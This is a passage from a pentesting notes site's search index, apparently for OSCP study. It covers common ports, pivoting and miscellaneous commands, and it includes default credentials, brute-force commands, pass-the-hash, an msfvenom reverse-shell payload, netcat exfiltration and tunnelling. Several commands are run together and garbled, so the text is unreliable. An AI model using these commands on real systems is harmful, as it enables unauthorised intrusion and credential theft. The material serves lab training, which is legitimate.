</ul>"},{"location":"Pentesting/Network/common-ports-and-services/#heartbleed","title":"Heartbleed","text":""},{"location":"Pentesting/Network/common-ports-and-services/#crime","title":"CRIME","text":""},{"location":"Pentesting/Network/common-ports-and-services/#breach","title":"Breach","text":""},{"location":"Pentesting/Network/common-ports-and-services/#certificate","title":"Certificate","text":""},{"location":"Pentesting/Network/common-ports-and-services/#port-554-rtsp","title":"Port 554 - RTSP","text":"<p>RTSP (Real Time Streaming Protocol) is a stateful protocol built on top of tcp usually used for streaming images. Many commercial IP-cameras are running on this port. They often have a GUI interface, so look out for that.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-587-submission","title":"Port 587 - Submission","text":"<p>Outgoing smtp-port</p> <p>If Postfix is run on it it could be vunerable to shellshock https://www.exploit-db.com/exploits/34896/\u200b</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-631-cups","title":"Port 631 - Cups","text":"<p>Common UNIX Printing System has become the standard for sharing printers on a linux-network. You will often see port 631 open in your priv-esc enumeration when you run <code>netstat</code>. You can log in to it here: http://localhost:631/admin\u200b</p> <p>You authenticate with the OS-users.</p> <p>Find version. Test cups-config --version. If this does not work surf to http://localhost:631/printers and see the CUPS version in the title bar of your browser.</p> <p>There are vulnerabilities for it so check your searchsploit.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-993-imap-encrypted","title":"Port 993 - Imap Encrypted","text":"<p>IMAP, or Internet Message Access Protocol, is a standard email protocol used for accessing email on a remote server. Port 993 specifically employs encryption, typically SSL/TLS, to secure the communication between the email client and the server, ensuring confidentiality and integrity of data transmission. It's commonly used for retrieving emails from a server securely, especially in environments where data privacy is a priority, such as in corporate or business email systems.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-995-pop3-encrypten","title":"Port 995 - POP3 Encrypten","text":"<p>Port 995 is the default port for the Post Office Protocol. The protocol is used for clients to connect to the server and download their emails locally. You usually see this port open on mx-servers. Servers that are meant to send and recieve email.</p> <p>Related ports: 110 is the POP3 non-encrypted.</p> <p>25, 465</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-1025-nfs-or-iis","title":"Port 1025 - NFS or IIS","text":"<p>NFS is a distributed file system protocol allowing clients to access files over a network. Port 1025 is used for NFS-related communication, facilitating the transfer and management of files between clients and servers within a network environment. In contrast, IIS typically uses ports 80 and 443 for HTTP and HTTPS communication.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-1030103210331038","title":"Port 1030/1032/1033/1038","text":"<p>Ports 1030, 1032, 1033, and 1038 are TCP ports used by various network services. Port 1030 is typically associated with Microsoft System Administration, while ports 1032, 1033, and 1038 have no standard assignments. These ports may be used by specific applications or services depending on system configurations. It's important to note that port numbers can be dynamically assigned or utilized by custom applications, so their exact purpose can vary. Therefore, network administrators should monitor and manage these ports to ensure network security and functionality.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-1433-mssql","title":"Port 1433 - MsSQL","text":"<p>Microsoft SQL Server (MsSQL), a relational database management system. It's used for communication between client applications and the SQL Server instance. This port facilitates queries, data retrieval, and database management tasks. Typically, organizations configure firewalls to allow traffic on port 1433 for SQL Server connections, both internally and externally.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#execute-commands","title":"Execute commands","text":"<p>To execute the date command to the following after logging in  </p><pre><code>xp_cmdshell date\n</code></pre> <p>Many of the scanning modules in metasploit requires authentication. But some do not.</p> <pre><code>use auxiliary/scanner/mssql/mssql_ping\n</code></pre> <pre><code>scanner/mssql/mssql_login\n</code></pre> <p>If you have credencials look in metasploit for other modules.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#brute-force","title":"Brute force","text":""},{"location":"Pentesting/Network/common-ports-and-services/#port-1521-oracle-database","title":"Port 1521 - Oracle database","text":"<p>Oracle Database, a relational database management system (RDBMS) developed by Oracle Corporation. This port serves as the default listener port for Oracle Database's SQL*Net protocol, facilitating communication between clients and the Oracle Database server. It is used for establishing connections, executing SQL queries, and managing database operations. </p> <ul> <li>Enumeration</li> </ul> <pre><code>tnscmd10g version -h iptnscmd10g status -h ip\n</code></pre> <ul> <li>Bruteforce the ISD</li> </ul> <pre><code>auxiliary/scanner/oracle/sid_brute\n</code></pre> <p>Connect to the database with <code>sqlplus</code></p> <p>Reference:</p> <p>\u200bhttp://www.red-database-security.com/wp/itu2007.pdf\u200b</p>"},{"location":"Pentesting/Network/common-ports-and-services/#ports-1748-1754-1808-1809-oracle","title":"Ports 1748, 1754, 1808, 1809 - Oracle","text":"<p>These are also ports used by oracle on windows. They run Oracles Intelligent Agent.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-2049-nfs","title":"Port 2049 - NFS","text":"<p>Network file system This is a service used so that people can access certain parts of a remote filesystem. If this is badly configured it could mean that you grant excessive access to users.</p> <p>If the service is on its default port you can run this command to see what the filesystem is sharing</p> <p>Then you can mount the filesystem to your machine using the following command</p> <pre><code>mount ip:/ /tmp/NFSmount -t ip:/ /tmp/NFS\n</code></pre> <p>Now we can go to /tmp/NFS and check out /etc/passwd, and add and remove files.</p> <p>This can be used to escalate privileges if it is not correct configured. Check chapter on Linux Privilege Escalation.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-2100-oracle-xml-db","title":"Port 2100 - Oracle XML DB","text":"<p>There are some exploits for this, so check it out. You can use the default Oracle users to access to it. You can use the normal ftp protocol to access it.</p> <p>Can be accessed through ftp. Some default passwords here: https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm Name: Version:</p> <p>Default logins: sys:sys scott:tiger</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-3268-globalcatldap","title":"Port 3268 - globalcatLdap","text":"<p>Global catalog LDAP (Lightweight Directory Access Protocol) service. The global catalog is a distributed data repository in Microsoft Active Directory that stores information about objects across multiple domains in a forest. Port 3268 facilitates queries to the global catalog, allowing clients to retrieve information about users, groups, and other directory objects from a centralized database. This port is commonly used in environments where Active Directory is deployed to support directory service operations across the network.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-3306-mysql","title":"Port 3306 - MySQL","text":"<p>MySQL, a widely-used open-source relational database management system. It serves as the default port for MySQL server connections, facilitating the exchange of data between client applications and the MySQL server. Port 3306 enables secure and efficient communication, allowing clients to connect to and interact with MySQL databases for various purposes such as storing, retrieving, and managing structured data. Always test the following:</p> <p>Username: root</p> <p>Password: root</p> <pre><code>mysql --host=ip -u root -pmysql -h  -u rootmysql -h  -u \"\"@localhost\u200btelnet ip 3306\n</code></pre> <p>You will most likely see this a lot:</p> <pre><code>ERROR 1130 (HY000): Host 'ip' is not allowed to connect to this MySQL server\n</code></pre> <p>This occurs because mysql is configured so that the root user is only allowed to log in from 127.0.0.1. This is a reasonable security measure put up to protect the database.</p> <p>\u200bhttp://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html\u200b</p> <pre><code>http://cse.unl.edu/~sscott/ShowFiles/SQL/CheatSheet/SQLCheatSheet.html\n</code></pre> <pre><code>You can also use mysql to upload a shell\n</code></pre> <p>If mysql is started as root you might have a chance to use it as a way to escalate your privileges.</p> <ul> <li>MYSQL UDF INJECTION</li> </ul> <p>\u200bhttps://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/\u200b</p> <ul> <li> </li> </ul> <p>You might gain access to a shell by uploading a reverse-shell. And then you need to escalate your privilege. One way to do that is to look into the databse and see what users and passwords that are available. Maybe someone is resuing a password?</p> <p>So the first step is to find the login-credencials for the database. Those are usually found in some configuration-file oon the web-server. For example, in joomla they are found in:</p> <pre><code>/var/www/html/configuration.php\n</code></pre> <p>In that file you find the</p> <pre><code>class JConfig {    var $fromname = 'testuser';    var $sendmail = '/usr/sbin/sendmail';    var $password = 'myPassowrd1234';    var $sitename = 'test';    var $MetaDesc = 'Joomla! - the dynamic portal engine and content management system';    var $MetaKeys = 'joomla, Joomla';    var $offline_message = 'This site is down for maintenance. Please check back again soon.';    }\n</code></pre>"},{"location":"Pentesting/Network/common-ports-and-services/#configuration-files","title":"Configuration files","text":""},{"location":"Pentesting/Network/common-ports-and-services/#mysql-commands-cheat-sheet","title":"Mysql-commands cheat sheet","text":""},{"location":"Pentesting/Network/common-ports-and-services/#uploading-a-shell","title":"Uploading a shell","text":""},{"location":"Pentesting/Network/common-ports-and-services/#escalating-privileges","title":"Escalating privileges","text":""},{"location":"Pentesting/Network/common-ports-and-services/#finding-passwords-to-mysql","title":"Finding passwords to mysql","text":""},{"location":"Pentesting/Network/common-ports-and-services/#port-3339-oracle-web-interface","title":"Port 3339 - Oracle web interface","text":"<p>This port is commonly associated with Oracle's web interface, often utilized for accessing and managing Oracle databases through a web browser. This port facilitates communication between client devices and the Oracle database server, allowing users to interact with the database management system remotely. It's an essential component for administering Oracle databases, providing a user-friendly interface for tasks such as database configuration, monitoring, and data manipulation.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-3389-remote-desktop-protocol","title":"Port 3389 - Remote Desktop Protocol","text":"<p>This is a proprietary protocol developed by windows to allow remote desktop.</p> <p>Log in like this</p> <pre><code>rdesktop -u guest -p guest ip -g 94%\n</code></pre> <p>Brute force like this</p> <pre><code>ncrack -vv --user Administrator -P /root/passwords.txt rdp://ip\n</code></pre> <p>This is categorized by microsoft as a RCE vulnerability. But there is no POC for it online. You can only DOS a machine using this exploit.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#ms12-020","title":"Ms12-020","text":""},{"location":"Pentesting/Network/common-ports-and-services/#port-4445-upnotifyp","title":"Port 4445 - Upnotifyp","text":"<p>Upnotifyp may be a custom service or application running on this port. Its exact functionality or purpose can vary depending on the specific implementation. This port could be used for notifications, updates, or other forms of communication within a network or between systems. Users encountering traffic on this port may need to investigate further to determine its origin and intended use within their network infrastructure.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-4555-rsip","title":"Port 4555 - RSIP","text":"<p>I have seen this port being used by Apache James Remote Configuration.</p> <p>There is an exploit for version 2.3.2</p> <p>\u200bhttps://www.exploit-db.com/docs/40123.pdf\u200b</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-47001-windows-remote-management-service","title":"Port 47001 - Windows Remote Management Service","text":"<p>This service allows remote management and administration of Windows-based systems over a network. It utilizes the WS-Management protocol, enabling administrators to execute commands, retrieve information, and manage systems remotely. Port 47001 is specifically used for secure communication using HTTPS, providing encryption and authentication mechanisms to ensure secure remote management of Windows machines.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-5357-wsdapi","title":"Port 5357 - WSDAPI","text":"<p>Web Services Dynamic Discovery (WSDAPI) enables devices and services on a network to communicate and discover each other dynamically. It's commonly used for printer and file sharing functionalities in Windows environments. Port 5357 facilitates the exchange of messages between devices and services using the WSDAPI protocol, allowing for seamless discovery and interaction on local networks.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-5722-dfsr","title":"Port 5722 - DFSR","text":"<p>The Distributed File System Replication (DFSR) service is a state-based, multi-master file replication engine that automatically copies updates to files and folders between computers that are participating in a common replication group. DFSR was added in Windows Server 2003 R2.</p> <p>When this port is open, it is a sign that the machine in question might be a domain controller.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-5900-vnc","title":"Port 5900 - VNC","text":"<p>VNC is used to get a screen for a remote host. But some of them have some exploits.</p> <p>You can use vncviewer to connect to a vnc-service. Vncviewer comes built-in in Kali.</p> <p>It defaults to port 5900. You do not have to set a username. VNC is run as a specific user, so when you use VNC it assumes that user. Also note that the password is not the user password on the machine. If you have dumped and cracked the user password on a machine does not mean you can use them to log in. To find the VNC password you can use the metasploit/meterpreter post exploit module that dumps VNC passwords</p> <pre><code>backgrounduse post/windows/gather/credentials/vncset session Xexploit\n</code></pre> <p>If you are unable to input ctr-alt-del (kali might interpret it as input for kali).</p> <p>Try <code>shift-ctr-alt-del</code></p>"},{"location":"Pentesting/Network/common-ports-and-services/#ctr-alt-del","title":"Ctr-alt-del","text":""},{"location":"Pentesting/Network/common-ports-and-services/#metasploit-scanner","title":"Metasploit scanner","text":"<p>You can scan VNC for logins, with bruteforce.</p> <ul> <li>Login scan</li> </ul> <pre><code>use auxiliary/scanner/vnc/vnc_loginset rhosts iprun\n</code></pre> <ul> <li>Scan for no-auth</li> </ul> <pre><code>use auxiliary/scanner/vnc/vnc_none_authset rhosts iprun\n</code></pre>"},{"location":"Pentesting/Network/common-ports-and-services/#port-8080","title":"Port 8080","text":"<p>Since this port is used by many different services. They are divided like this.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#tomcat","title":"Tomcat","text":"<p>Tomcat suffers from default passwords. There is even a module in metasploit that enumerates common tomcat passwords. And another module for exploiting it and giving you a shell.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-9389","title":"Port 9389","text":"<p>Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and is available on Windows 7 when you install the Remote Server Administration Tools (RSAT).</p> <p>\u200b \u200b</p>"},{"location":"Pentesting/Network/dns-zone-transfer-attack/","title":"DNS Zone Transfer Attack","text":""},{"location":"Pentesting/Network/dns-zone-transfer-attack/#dns-zone-transfer-attack","title":"DNS Zone Transfer Attack","text":"<p>Sometimes DNS servers are misconfigured. The DNS server contains a Zone file which it uses to replicate the map of a domain. They should be configured so that only the replicating DNS-server can access it, but sometimes it is misconfigured so anyone can request the zone file, and thereby recieve the whole list of subdomains. This can be done the following way:</p> <p>To do this we first need to figure out which DNS-servers a domain has.</p> <pre><code>host -l wikipedia.com ns1.wikipedia.com\n</code></pre> <p>This can also be done with tools such as dnsrecon and dnsenum.</p> <ul> <li>\u200bhttps://security.stackexchange.com/questions/10452/dns-zone-transfer-attack\u200b</li> </ul>"},{"location":"Pentesting/Network/main-tools/","title":"Tools","text":""},{"location":"Pentesting/Network/main-tools/#tools","title":"Tools","text":""},{"location":"Pentesting/Network/main-tools/#tools-for-linux","title":"Tools for linux","text":"<ul> <li>linux smart enumeration</li> <li>pspy64linenum</li> <li>shlinpeas</li> <li>shlpe</li> <li>shlinux</li> <li>sugegster</li> <li>berootbashark</li> <li>linuxprivchecker.py</li> </ul>"},{"location":"Pentesting/Network/main-tools/#tools-for-windows","title":"Tools for windows","text":"<ul> <li>winpeas</li> <li>windowexploit</li> <li>suggester</li> <li>powershellpowerup</li> <li>sharpup</li> <li>seatbelt</li> <li>juicypotato</li> <li>Sherlock</li> <li>windowprivchecker.bat</li> <li>JAWSsqsh</li> </ul>"},{"location":"Pentesting/Network/main-tools/#common-tools","title":"Common Tools","text":"<ul> <li>toolsNmap</li> <li>automator</li> <li>Autorecon</li> <li>OnetwoPunch</li> <li>Dirsearch</li> <li>Nikto</li> <li>Nmap</li> <li>DirbGobuster</li> <li>Wfuzz</li> <li>Smbserver</li> <li>Wpscan</li> <li>Magescan</li> <li>Odat</li> <li>Hashcat</li> <li>John the ripper</li> <li>SmbClient</li> <li>smbmapsnmp</li> <li>checkerenum4linux</li> </ul>"},{"location":"Pentesting/Network/misc/","title":"Miscellaneous Commands","text":""},{"location":"Pentesting/Network/misc/#miscellaneous-commands","title":"Miscellaneous Commands","text":"<p>Compiling Exploits</p> <pre><code>gcc -o exploit exploit.c#Compile C code, add \u2013m32 after \u2018gcc\u2019 for compiling 32 bit code on 64 bit Linuxi586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe\u200bCross compilingCompile Windows exploit in Linuxi686-w64-mingw32-gcc 18176.c -lws2_32 -o 18176.exe\u200bCompile Python script to executablewine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile exploit.py\n</code></pre> <p>Packet Inspection</p> <pre><code>tcpdump tcp port 80 -w output.pcap -i eth0\u200b\n</code></pre> <p>Powershell bypass</p> <pre><code>Powershell: powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1\u200b\n</code></pre> <p>Window Exploit Suggester</p> <pre><code> ./windows-exploit-suggester.py -d 2019-07-20-mssb.xls -i system.txt\n</code></pre> <p>Finding Auxiliary</p> <pre><code> ls /usr/share/nmap/scripts/ | grep smb | grep vuln\u200b\n</code></pre> <p>Netcat</p> <pre><code>From attacker to targetAt targetnc -lvp 6969 &gt; blah.txtAt attacker (method 1)nc x.x.x.x 6969 &lt; blah.txtAt attacker (method 2)cat blah.txt | nc x.x.x.x 6969\n</code></pre> <p>Perl Exploit</p> <pre><code>Perl Exploitperl \u2014e 'exec \"/bin/sh\";'sudo perl -F: -lane 'print $F[0]' /root/root.txt\n</code></pre> <p>Awk</p> <pre><code>Remove duplicate lines:awk '!seen[$0]++' file\n</code></pre> <p>Searchsploit</p> <pre><code>searchsploit --overflow --exact --mirror 21234\u200b searchsploit --overflow --exact Gwolle\n</code></pre> <p>Firewall Rule Enable</p> <pre><code>firewall rule enableufw allow from victimip to any port 80,443 proto tcp\u200b\n</code></pre> <p>Wordlist Creation</p> <pre><code>Wordlist creation:cewl -w cewl-forum.txt -e -a http://forum.bart.htb\n</code></pre> <p>PASS the HASH</p> <pre><code>\u200bPass the hash :pth-winexe -U jenkins/administrator //ip cmd.exepth-winexe -U jenkins/administrator%password //ip cmd.execrackmapexec\u200b pth-winexe --user=jeeves/administrator%aad3b435b51404e eaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 --system //10.10.10.63 cmd.exe\u200b\n</code></pre> <p>Share folder Windows to linux</p> <pre><code>mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow\\_other\n</code></pre>"},{"location":"Pentesting/Network/oscp-one-page-repository/","title":"OSCP- One Page Repository","text":""},{"location":"Pentesting/Network/oscp-one-page-repository/#oscp-one-page-repository","title":"OSCP- One Page Repository","text":""},{"location":"Pentesting/Network/oscp-one-page-repository/#hello-everyone-this-is-the-one-page-repository-for-oscp-learners","title":"Hello Everyone. This is the one page repository for OSCP learners.","text":""},{"location":"Pentesting/Network/oscp-one-page-repository/#1-kali-linux-basic-knowledge","title":"1. Kali Linux Basic knowledge","text":""},{"location":"Pentesting/Network/oscp-one-page-repository/#2-learn-basics-bash-scripting-and-python-language","title":"2. Learn Basics Bash Scripting and Python Language","text":""},{"location":"Pentesting/Network/oscp-one-page-repository/#3-recon-learn-about-network-reconnaissance","title":"3. Recon: Learn about network reconnaissance","text":""},{"location":"Pentesting/Network/oscp-one-page-repository/#4-vulnerable-machines","title":"4. Vulnerable Machines","text":"<p>Now move to vulnerable machines. There are two main websites for practice on vulnerable machines. </p> <p>Hackthebox machines and Vulnhub Machines. There are multiples infosec guys who has written blogs related to these machines for community. First thing you need to do, read blogs for 5 machine and try to understand the approach for start on these machines.</p> <p>TjNull has shared a list which has OSCP related boxes.</p> <p></p> <p>Vulnhub List</p> <p></p> <p>Hackthebox List</p>"},{"location":"Pentesting/Network/oscp-one-page-repository/#5-public-exploits","title":"5. Public Exploits","text":"<p>Most of the time in OSCP you will need to use a public exploit on your target to see if you can obtain a shell on it. With that exploit you may need to modify shellcode or even parts of the exploit to match with your system to obtain a connection from your target.</p> <p>SearchSploit - Offline kali Database - https://www.exploit-db.com/searchsploit</p>"},{"location":"Pentesting/Network/oscp-one-page-repository/#6-file-transfer","title":"6. File Transfer","text":"<p>There are multiple ways to transfer the files from attacker system to target system.</p>"},{"location":"Pentesting/Network/oscp-one-page-repository/#windows","title":"Windows","text":"<ul> <li>VBS Script</li> <li>SMB Server</li> <li>HTTP Server</li> <li>FTP Server</li> <li>TFTP Server</li> <li>Powershell</li> <li>Debug.exe</li> <li>Certutil</li> </ul>"},{"location":"Pentesting/Network/oscp-one-page-repository/#linux","title":"Linux","text":"<ul> <li>Python Server</li> <li>Curl</li> <li>Wget</li> <li>Netcat</li> <li>FTP</li> <li>PHP</li> <li>SCP - SSH</li> </ul>"},{"location":"Pentesting/Network/oscp-one-page-repository/#7-privilege-escalation","title":"7. Privilege Escalation","text":"<ul> <li> <p>For Practice on Local Machine:</p> </li> <li> <p>Windows Privilege Escalation</p> </li> <li> <p>Linux Privilege Escalation</p> </li> </ul>"},{"location":"Pentesting/Network/oscp-one-page-repository/#8-web-app-vulnerabilities","title":"8. Web App Vulnerabilities","text":"<ul> <li>Vulnerable Application for Practice:</li> <li>Metasploitable 2</li> <li>BWAPP</li> <li>Multidae</li> </ul>"},{"location":"Pentesting/Network/oscp-one-page-repository/#9-buffer-overflow","title":"9. Buffer Overflow","text":"<ul> <li>Exploiting Simple Buffer Overflow on Win 32 https://www.pentesteracademy.com/course?id=13\u200b</li> <li>For Practice:-</li> <li>Windows Binaries (Recommend that you run these on Windows 7/XP 32 bit):</li> </ul>"},{"location":"Pentesting/Network/oscp-one-page-repository/#10-pivoting-port-forwarding","title":"10 Pivoting &amp; Port Forwarding","text":""},{"location":"Pentesting/Network/oscp-one-page-repository/#youtube-channels-for-oscp-related-htb-boxes-writeups","title":"Youtube Channels for OSCP related HTB Boxes writeups","text":"<p>HTB Boxes to Prepare for OSCP (Youtube Playlist): https://www.youtube.com/playlist?list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf</p> <ul> <li>Windows Privilege Escalation</li> <li>Winpeas</li> <li>Powerup</li> <li>Sharpup</li> <li>Seatbelt</li> <li> <p>Windows Priv checker</p> </li> <li> <p>Linux Privilege Escalation</p> </li> <li>Linux smart enumeration</li> <li>Pspy64</li> <li>Linpeas</li> <li>Lpe</li> <li>Linux Exploit Suggester</li> <li>Beroot</li> <li>Bashark</li> <li>Linux priv checker</li> <li>Password Cracking</li> <li>Online Tools for Password Cracking:</li> <li>Wordlists:</li> <li>In Kali: /usr/share/wordlists</li> <li>Seclists: apt-get install seclists You can find all of his password lists here: https://github.com/danielmiessler/SecLists/tree/master/Passwords\u200b</li> <li>Online Password Crackers: \u200b</li> </ul>"},{"location":"Pentesting/Network/oscp-vulnhub-practice-learning/","title":"OSCP/ Vulnhub Practice learning","text":""},{"location":"Pentesting/Network/oscp-vulnhub-practice-learning/#oscp-vulnhub-practice-learning","title":"OSCP/ Vulnhub Practice learning","text":""},{"location":"Pentesting/Network/oscp-vulnhub-practice-learning/#hackthebox-boxes","title":"HacktheBox Boxes","text":""},{"location":"Pentesting/Network/oscp-vulnhub-practice-learning/#linux-boxes","title":"Linux Boxes","text":"<ul> <li>Lame</li> <li>brainfuck</li> <li>shocker</li> <li>bashed</li> <li>nibbles</li> <li>beep</li> <li>cronos</li> <li>nineveh</li> <li>sense</li> <li>solidstate</li> <li>node</li> <li>valentine</li> <li>poison</li> <li>sunday</li> <li>tartarsauce</li> <li>Irked</li> <li>Friendzone</li> <li>Swagshop</li> <li>Networked</li> <li>jarvis</li> </ul>"},{"location":"Pentesting/Network/oscp-vulnhub-practice-learning/#windows-boxes","title":"Windows Boxes","text":"<ul> <li>legacy</li> <li>Blue</li> <li>Devel</li> <li>Optimum</li> <li>Bastard</li> <li>granny</li> <li>Arctic</li> <li>grandpa</li> <li>silo</li> <li>bounty</li> <li>jerry</li> <li>conceal</li> <li>chatterbox</li> <li>Forest</li> <li>BankRobber</li> </ul>"},{"location":"Pentesting/Network/oscp-vulnhub-practice-learning/#more-challenging-than-oscp-but-good-practice","title":"More challenging than OSCP, but good practice","text":"<ul> <li>Jeeves [Windows]</li> <li>Bart [Windows]</li> <li>Tally [Windows]</li> <li>Active [Windows]</li> <li>Kotarak [Linux]</li> <li>falafel [Linux]</li> <li>Devops [Linux]</li> <li>Hawk [Linux]</li> <li>Netmon [Windows]</li> <li>Lightweight [Linux]</li> <li>La Casa De Papel [Linux]</li> <li>Jail [Linux]</li> <li>Safe [Linux]</li> <li>Bitlab [Linux]</li> </ul>"},{"location":"Pentesting/Network/oscp-vulnhub-practice-learning/#vulnhub-boxes","title":"Vulnhub Boxes","text":""},{"location":"Pentesting/Network/oscp-vulnhub-practice-learning/#beginner-friendly","title":"Beginner friendly","text":"<ul> <li>Kioptrix: Level 1 (#1) [ok]</li> <li>Kioptrix: Level 1.1 (#2) [ok]</li> <li>Kioptrix: Level 1.2 (#3) [ok]</li> <li>Kioptrix: Level 1.3 (#4) [ok]</li> <li>FristiLeaks: 1.3 [ok]</li> <li>Stapler: 1 [ok]</li> <li>PwnLab: init [ok]</li> <li>Pluck: 1 [ok]</li> <li>W1R3S: 1.0.1 [ok]</li> </ul>"},{"location":"Pentesting/Network/oscp-vulnhub-practice-learning/#intermediate","title":"Intermediate","text":"<ul> <li>Kioptrix: 2014 [ok]</li> <li>Brainpan: 1 (Part 1 of BO is relevant to OSCP. egghunting is out of scope though)</li> <li>Mr-Robot: 1 [ok]</li> <li>HackLAB: Vulnix [ok]</li> <li>Not so sure (Didn't solve them yet):</li> <li>VulnOS: 2 [ok]</li> <li>SickOs: 1.2 [ok]</li> <li>/dev/random: scream</li> <li>pWnOS: 2.0</li> <li>SkyTower: 1</li> <li>IMF</li> <li>Lord of the Root 1.0.1 [ok]</li> <li>Tr0ll</li> <li>Pegasus</li> <li>SkyTower [ok]</li> </ul>"},{"location":"Pentesting/Network/oscp-vulnhub-practice-learning/#windows","title":"Windows","text":"<ul> <li>Metasploitable 3</li> <li> <p>Bobby: 1 (Uses VulnInjector, need to provide you own ISO and key.)</p> </li> <li> <p></p> </li> <li></li> <li></li> <li></li> <li></li> </ul>"},{"location":"Pentesting/Network/pivoting/","title":"Pivoting","text":""},{"location":"Pentesting/Network/pivoting/#pivoting","title":"Pivoting","text":"<p>Local port forwarding: Forward a local port to a remote host</p> <pre><code>ssh -L &lt;local_port&gt;:&lt;remote_host&gt;:&lt;remote_port&gt; &lt;username&gt;@&lt;remote_host&gt;\n</code></pre> <p>Remote port forwarding: Forward a remote port to a local host</p> <p></p><pre><code>ssh -R &lt;remote_port&gt;:&lt;local_host&gt;:&lt;local_port&gt; &lt;username&gt;@&lt;remote_host&gt;\n</code></pre> Dynamic port: Create a dynamic port forwarding <pre><code>ssh -D &lt;local_port&gt; -p &lt;remote_port&gt; &lt;username&gt;@&lt;remote_host&gt;\n</code></pre> <p>SOCAT</p> <pre><code>socat file:`tty`,raw,echo=0 tcp-listen:8989\n</code></pre> <p>PORT FORWARDING \"port to port\":</p> <ul> <li>MSF: Most platforms</li> </ul> <p>Forward: Get meterpreter session on one of the dual homed machines  </p><pre><code>portfwd add -l 4445 -p 4443 -r ip\n</code></pre> Use -R to make it reverse <ul> <li>SSH: For Linux  </li> </ul> <p>If you already have an SSH session </p><pre><code>~C\n</code></pre> on my Kali machine listen on 8081, get it from 172.24.0.2:80 <pre><code>-R 8081:ip:80\n</code></pre> Now you can access 172.24.0.2:80, which you didn't have direct access to <pre><code>:8081&lt;------------:80 \n</code></pre> on your machine listen on 8083, send it to my Kali machine on 8084 <pre><code>-L 8083:ip:8084\n</code></pre> Run nc on port 8084, and if ip:8083 receives a reverse shell, you will get it, <pre><code>:8084&lt;------------:8083&lt;------------:XXXX \n</code></pre> <p>For reverse shell: </p> <p></p><pre><code>msfvenom -p linux/x86/shell\\_reverse\\_tcp LHOST=10.1.1.230 LPORT=8083 -f exe -o shell\n</code></pre> Run it on 2<sup>nd</sup> remote target to get a shell on Kali <p>Or if you didn't have an SSH session, then SSH to your Kali from target machine:  On Kali: service ssh start,add a user, give it /bin/false in /etc/passwd</p> <pre><code>ssh -R 12345:192.168.122.228:5986\n</code></pre> <ul> <li>PLINK: Just like SSH, on Windows start ssh service, and transfer <code>/usr/share/windows-binaries/plink.exe</code> to the target machine</li> </ul> <pre><code>On Target: plink.exe ip -P 22 -C -N -L 0.0.0.0:4445:ip:4443 -l KALIUSER -pw PASS\n</code></pre> <ul> <li>SOCAT: For linux</li> </ul> <p>Forward your 8083 to ip:443 </p> <pre><code>./socat TCP4-LISTEN:8083,fork TCP4:ip:443\n</code></pre> <ul> <li>CHISEL: Most platforms</li> </ul> <p>Remote static tunnels \"port to port\":</p> <p>On Kali \"reverse proxy listener\":  </p><pre><code>./chisel server -p 8000 -reverse\n</code></pre> <p>General command:  </p><pre><code>./chisel client : L/R:\\[YOUR LOCAL IP]:::\n</code></pre> <p>Remote tunnels \"access IP:PORT you couldn't access before\": </p> <p></p><pre><code>On Target: ./chisel client ip:8000 R:127.0.0.1:8001:172.19.0.3:80\n</code></pre> Local tunnels \"listen on the target for something, and send it to us\":  <pre><code>On Target: ./chisel client 10.1.1.1:8000 9001:127.0.0.1:8003\n</code></pre> <p>DYNAMIC \"port to any\": setup proxychains with socks5 on 127.0.0.1:1080 Or set up socks5 proxy on firefox For nmap use -Pn -sT or use tcp scanner in msf</p> <ul> <li>MSF: Most platforms</li> </ul> <p>Get meterpreter session on one of the dual homed machines Auto route to ip (multi/manage/autoroute) Start socks proxy (auxiliary/server/socks4a)</p> <ul> <li>SSH: For Linux</li> </ul> <pre><code>-D1080\n</code></pre> <ul> <li>PLINK: Just like SSH, on Windows</li> </ul> <pre><code>On Target: plink.exe ip -P 22 -C -N -D 1080 -l KALIUSER -pw PASS\n</code></pre> <ul> <li>CHISEL: Most platforms</li> </ul> <p></p><pre><code>On Kali: ./chisel server -p 8000 -reverse\n</code></pre> <pre><code>On Target: ./chisel client ip:8000 R:8001:127.0.0.1:1080 ./chisel server -p 8001 --socks5\n</code></pre> <pre><code>On Kali: ./chisel client 127.0.0.1:8001 socks\n</code></pre>"},{"location":"Pentesting/Network/port-and-services-scanning/","title":"Port &amp; Services Scanning","text":""},{"location":"Pentesting/Network/port-and-services-scanning/#port-services-scanning","title":"Port &amp; Services Scanning","text":""},{"location":"Pentesting/Network/port-and-services-scanning/#for-tcp-scan-nmap","title":"For TCP Scan - Nmap","text":"<p>TCP Scan: </p><pre><code>\u200bnmap -Pn -v -sS -A -T4 XXIPXXXnmap -Pn -sS --stats-every 3m --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p1-65535 -oA /root/Documents/XXXX XXIPXXXnmap -sC -sV -vv -oA quick ipnmap 